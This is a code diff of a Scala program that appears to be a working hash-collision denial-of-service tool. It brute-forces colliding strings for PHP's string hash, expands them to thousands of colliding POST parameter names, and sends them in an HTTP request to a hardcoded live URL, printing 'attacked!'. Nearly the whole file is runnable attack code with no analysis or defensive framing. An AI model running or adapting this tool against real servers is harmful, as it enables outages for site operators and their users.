@@ -2,19 +2,28 @@ import java.io.{ObjectOutputStream, FileOutputStream}
 import dispatch._
 import scala.actors._
 
-class DoS(url: String, port: Int) extends Actor {
+class DoS(target: String, port: Int) extends Actor {
 	def act {
-		Collision.attackURL(url, port, Collision.postParams)
+		try {
+			val req = url(target)
+	    	val http = new Http
+			http((req << Collision.postParams) as_str)
+		} catch {
+			case e: java.net.UnknownHostException => println("Couldn't find host. Did you mistype the adress / IP ?")
+				
+			case e => println("Unkown exception: " + e)
+		}
 	}
 }
 
 object Collision { 
 	var postParams = List( ("a", "b") )
+	val charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
 	def main(args: Array[String]) {
-		val numIterations: Int = if(args.length < 1) 10000 else args(0).toInt
-		var collisions = List[String]()	// prefilled for testing only
+		val numIterations = charset.length * charset.length
+		var collisions = List[String]()
 		val collisionExponent = 9
-		val filename = "collisions.txt"
 		val hashFun = phpHash _
 
 		println("Searching for at least three colliding strings")
@@ -22,36 +31,23 @@ object Collision {
 		while(collisions.length < 3) {
 			val stringSeed = util.Random.nextInt(5184)
 			val hash = hashFun(StringFromInt(stringSeed))
-			// hashcode range for AA to zz
 			collisions = findStringsForHashCode(numIterations, hash, hashFun)
 		}
 
 		print("Found them: ")
 		println(collisions.map("\"" + _ + "\"").mkString(", "))
-		println("For hashcode " + hashFun( collisions.head )
+		println("For hashcode " + hashFun( collisions.head ) )
 
-		println("Generating %d^%d = %d derived collisions".format(collisions.length, collisionExponent, math.pow(collisions.length, collisionExponent)))
+		println("Generating %d^%d = %.0f derived collisions".format(collisions.length, collisionExponent, math.pow(collisions.length, collisionExponent)))
 
 		val manyCols = makeCollisions(collisions.toArray, collisionExponent)
-
-    	
 
 		postParams = manyCols.toList.map( (_, "a") )
 
     	(0 to 0).foreach( t => (new DoS("http://furidamu.org/index.php", 80)).start() )
 
-    	print("attacked!")
-
+    	println("attacked!")
 	}
-
-	def attackURL(target: String, port: Int, postParams: List[(String, String)]) {
-		val req = url(target)
-		val ignoreResult = (req << postParams) >|
-	    val http = new Http
-		http((req << postParams) as_str)
-	}
-
-	val charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 	def makeCollisions(baseCols: Array[String], raisedTo: Int) = {
 		val state = (1 to raisedTo).map(t => 0).toArray
@@ -75,18 +71,8 @@ object Collision {
 		else StringFromInt(n / charset.length) + charset.charAt((n-1) % charset.length)
 	}
 
-	def findStringsForHashCode(numIterations: Int, code: Int, hashFun: String => Int) = {
-		var collisions = List[String]()
-		var i = 0
-		while(i < numIterations) {
-			if(hashFun(StringFromInt(i)) == code) {
-				collisions ::= StringFromInt(i)
-			}
-			i += 1
-		}
-			
-		collisions	
-	}
+	def findStringsForHashCode(numIterations: Int, code: Int, hashFun: String => Int) = 
+		(0 until numIterations).map(StringFromInt(_)).filter(hashFun(_) == code).toList
 
 	def javaHash(s: String) = s.map(_.toInt).reduceLeft( (hash, next) => hash * 31 + next)
 
